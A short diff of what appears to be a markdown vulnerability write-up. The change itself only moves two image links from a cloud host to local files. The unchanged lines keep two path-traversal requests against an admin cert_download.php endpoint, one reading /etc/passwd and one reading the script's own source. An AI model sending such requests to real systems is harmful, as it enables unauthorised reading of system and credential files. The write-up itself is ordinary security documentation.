@@ -38,10 +38,10 @@ exit();
 /admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162231024.png)
+![](./images/202202162231024.png)
 
 ```plain
 /admin/cert_download.php?file=test.txt&certfile=cert_download.php
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162234357.png)
+![](./images/202202162234357.png)
